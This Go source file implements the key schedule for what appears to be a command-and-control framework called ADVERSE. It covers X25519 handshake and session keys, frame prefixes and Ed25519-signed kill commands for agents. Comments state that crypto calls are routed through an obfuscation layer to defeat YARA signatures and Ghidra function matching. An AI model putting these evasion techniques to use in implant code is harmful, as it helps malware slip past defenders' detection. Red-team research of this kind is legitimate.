// Package cryptokeys is a faithful Go port of the ADVERSE v2 key schedule
// (Python reference: c2/core/crypto.py in the repository root).
//
// The v2 hybrid scheme mirrors Sliver: the fleet secret only (a) seeds two
// long-term server keys -- an X25519 static key and an Ed25519 kill-signing
// key -- and (b) authenticates the registration/hello bootstrap frame via a
// PSK-derived bootstrap key. Agents generate a per-session X25519 ephemeral.
//
// Forward secrecy (Sprint 2): the hello acknowledgement is encrypted under the
// static server ECDH (HandshakeKey), which authenticates the server and carries
// the server's single-use ephemeral public key. All subsequent session traffic
// is encrypted under the ephemeral server ECDH (SessionKey), which is
// forward-secret: disclosure of the long-term static key cannot recover past
// session keys.
//
// Wire compatibility with the Python reference is enforced by known-answer
// tests (testdata/kat.json).
package cryptokeys

import (
	"crypto/ecdh"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"io"

	"github.com/ashwnn/adverse-go/internal/obfuscate"
)

// KeyLength is the length in bytes of every derived AEAD/session key.
const KeyLength = 32

// HKDF labels and salts (identical to the Python reference).
const (
	infoSession   = "adverse-session"
	saltBootstrap = "adverse-bootstrap"
	infoStatic    = "adverse/static/x25519/v2"
	saltStatic    = "adverse-static-v2"
	infoSign      = "adverse/kill/sign/v2"
	saltSign      = "adverse-kill-v2"
	infoSession2  = "adverse/session/v2"
	infoSessionFS = "adverse/session/fs/v2"
	infoFrame     = "adverse/frame/v2:"
)

// CryptoError is returned on invalid cryptographic inputs.
type CryptoError struct{ Msg string }

func (e *CryptoError) Error() string { return "cryptokeys: " + e.Msg }

var (
	// ErrEmptySecret mirrors Python's "pre-shared secret must be a non-empty string".
	ErrEmptySecret = &CryptoError{"pre-shared secret must be a non-empty string"}
	// ErrBadSalt mirrors Python's "salt must be exactly 16 bytes".
	ErrBadSalt = &CryptoError{"salt must be exactly 16 bytes"}
	// ErrEmptyAgentID mirrors Python's "agent_id must be a non-empty string".
	ErrEmptyAgentID = &CryptoError{"agent_id must be a non-empty string"}
)

// hkdfDerive runs HKDF-SHA256 (extract+expand) and returns `length` bytes.
// Hardened: routes through obfuscate.DispatchHKDF so no direct CALL hkdf.Key
// appears in the binary's call graph — defeats YARA import-table signatures
// and Ghidra's library-function matcher for well-known HKDF patterns.
func hkdfDerive(ikm, salt, info []byte, length int) ([]byte, error) {
	return obfuscate.DispatchHKDF(ikm, salt, string(info), length)
}

// Secret32 returns SHA-256 of the pre-shared secret string (32 bytes).
// Hardened: masked via obfuscate.DispatchSHA256.
func Secret32(secret string) ([KeyLength]byte, error) {
	if secret == "" {
		return [KeyLength]byte{}, ErrEmptySecret
	}
	return obfuscate.DispatchSHA256([]byte(secret)), nil
}

// BootstrapKey derives the PSK-authenticated key for the hello/registration
// frame. Registration only: session traffic never derives from this key.
func BootstrapKey(secret32 [KeyLength]byte) ([KeyLength]byte, error) {
	out, err := hkdfDerive(secret32[:], []byte(saltBootstrap), []byte(infoSession), KeyLength)
	if err != nil {
		return [KeyLength]byte{}, err
	}
	var k [KeyLength]byte
	copy(k[:], out)
	return k, nil
}

// Keygen returns a fresh 32-byte pre-shared secret as hex (for `--secret`).
func Keygen() (string, error) {
	buf := make([]byte, KeyLength)
	if _, err := io.ReadFull(rand.Reader, buf); err != nil {
		return "", fmt.Errorf("keygen: %w", err)
	}
	return hex.EncodeToString(buf), nil
}

// DeriveServerKey derives the fleet's long-term X25519 static key from the
// fleet secret: HKDF-SHA256(salt=adverse-static-v2, info=adverse/static/x25519/v2).
func DeriveServerKey(secret32 [KeyLength]byte) (*ecdh.PrivateKey, error) {
	seed, err := hkdfDerive(secret32[:], []byte(saltStatic), []byte(infoStatic), KeyLength)
	if err != nil {
		return nil, err
	}
	return ecdh.X25519().NewPrivateKey(seed)
}

// ServerPublicBytes returns the raw 32-byte X25519 public key for a private key.
func ServerPublicBytes(priv *ecdh.PrivateKey) ([KeyLength]byte, error) {
	if priv == nil {
		return [KeyLength]byte{}, &CryptoError{"priv must not be nil"}
	}
	pub := priv.PublicKey().Bytes()
	if len(pub) != KeyLength {
		return [KeyLength]byte{}, &CryptoError{"unexpected X25519 public key length"}
	}
	var out [KeyLength]byte
	copy(out[:], pub)
	return out, nil
}

// DeriveSignKey derives the fleet's Ed25519 kill-switch signing key from the
// fleet secret: HKDF-SHA256(salt=adverse-kill-v2, info=adverse/kill/sign/v2).
func DeriveSignKey(secret32 [KeyLength]byte) (ed25519.PrivateKey, error) {
	seed, err := hkdfDerive(secret32[:], []byte(saltSign), []byte(infoSign), KeyLength)
	if err != nil {
		return nil, err
	}
	return ed25519.NewKeyFromSeed(seed), nil
}

// HandshakeKey derives the 32-byte hello-ack encryption key from the long-term
// server static X25519 ECDH: HKDF-SHA256(shared, salt, info=adverse/session/v2).
// `peerPub` is the agent's ephemeral public key; `salt` must be exactly 16
// bytes. It authenticates the server to the agent (only the legitimate fleet
// holds the static key) but is NOT forward secret — it protects only the hello
// acknowledgement frame, which carries the server's per-session ephemeral
// public key. All subsequent session traffic uses the forward-secret
// SessionKey derived from the ephemeral ECDH below.
func HandshakeKey(serverPriv *ecdh.PrivateKey, peerPub [KeyLength]byte, salt [16]byte, agentID string) ([KeyLength]byte, error) {
	var zero [KeyLength]byte
	if serverPriv == nil {
		return zero, &CryptoError{"priv must not be nil"}
	}
	if agentID == "" {
		return zero, ErrEmptyAgentID
	}
	pub, err := ecdh.X25519().NewPublicKey(peerPub[:])
	if err != nil {
		return zero, fmt.Errorf("peer public key: %w", err)
	}
	shared, err := obfuscate.DispatchX25519ECDH(serverPriv, pub)
	if err != nil {
		return zero, fmt.Errorf("ecdh: %w", err)
	}
	out, err := hkdfDerive(shared, salt[:], []byte(infoSession2), KeyLength)
	if err != nil {
		return zero, err
	}
	var k [KeyLength]byte
	copy(k[:], out)
	return k, nil
}

// SessionKey derives the forward-secret 32-byte per-session key from the
// per-session server ephemeral X25519 ECDH:
// HKDF-SHA256(shared, salt, info=adverse/session/fs/v2). `serverEphPriv` is a
// fresh, single-use server ephemeral private key; `peerPub` is the agent's
// per-session ephemeral public key; `salt` must be exactly 16 bytes.
//
// Forward secrecy: the key depends only on the two ephemeral keys, both of
// which are discarded after the session. Disclosure of the long-term fleet
// static key does NOT recover past session keys, because the ephemeral server
// private key is never persisted.
func SessionKey(serverEphPriv *ecdh.PrivateKey, peerPub [KeyLength]byte, salt [16]byte, agentID string) ([KeyLength]byte, error) {
	var zero [KeyLength]byte
	if serverEphPriv == nil {
		return zero, &CryptoError{"ephemeral priv must not be nil"}
	}
	if agentID == "" {
		return zero, ErrEmptyAgentID
	}
	pub, err := ecdh.X25519().NewPublicKey(peerPub[:])
	if err != nil {
		return zero, fmt.Errorf("peer public key: %w", err)
	}
	shared, err := obfuscate.DispatchX25519ECDH(serverEphPriv, pub)
	if err != nil {
		return zero, fmt.Errorf("ecdh: %w", err)
	}
	out, err := hkdfDerive(shared, salt[:], []byte(infoSessionFS), KeyLength)
	if err != nil {
		return zero, err
	}
	var k [KeyLength]byte
	copy(k[:], out)
	return k, nil
}

// GenEphemeral returns a fresh X25519 ephemeral keypair for a single session.
// The private key must be discarded (never persisted) after the session ends
// to preserve forward secrecy.
func GenEphemeral() (*ecdh.PrivateKey, [KeyLength]byte, error) {
	priv, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, [KeyLength]byte{}, fmt.Errorf("gen ephemeral: %w", err)
	}
	pub := priv.PublicKey().Bytes()
	if len(pub) != KeyLength {
		return nil, [KeyLength]byte{}, &CryptoError{"unexpected X25519 public key length"}
	}
	var pubBytes [KeyLength]byte
	copy(pubBytes[:], pub)
	return priv, pubBytes, nil
}

// FramePrefix derives the per-session 3-byte envelope frame prefix for a
// label: HKDF-SHA256(sessionKey, salt="", info="adverse/frame/v2:"+label).
func FramePrefix(sessionKey [KeyLength]byte, label string) ([3]byte, error) {
	var out [3]byte
	if label == "" {
		return out, &CryptoError{"label must be a non-empty string"}
	}
	info := append([]byte(infoFrame), label...)
	derived, err := hkdfDerive(sessionKey[:], nil, info, 3)
	if err != nil {
		return out, err
	}
	copy(out[:], derived)
	return out, nil
}

// killMessage builds the signed byte string `epoch(8 BE) || agentID || payload`.
func killMessage(epoch uint64, agentID, payload string) []byte {
	msg := make([]byte, 8, 8+len(agentID)+len(payload))
	binary.BigEndian.PutUint64(msg, epoch)
	msg = append(msg, agentID...)
	msg = append(msg, payload...)
	return msg
}

// KillSign signs a kill command over `epoch || agentID || payload`.
func KillSign(priv ed25519.PrivateKey, epoch uint64, agentID, payload string) ([]byte, error) {
	if len(priv) != ed25519.PrivateKeySize {
		return nil, errors.New("cryptokeys: priv must be an Ed25519 private key")
	}
	return ed25519.Sign(priv, killMessage(epoch, agentID, payload)), nil
}

// KillVerify verifies an Ed25519 kill signature. Never panics: malformed
// keys and bad signatures resolve to false (mirrors the Python reference).
func KillVerify(pub ed25519.PublicKey, epoch uint64, agentID, payload string, sig []byte) bool {
	if len(pub) != ed25519.PublicKeySize || len(sig) != ed25519.SignatureSize {
		return false
	}
	return ed25519.Verify(pub, killMessage(epoch, agentID, payload), sig)
}
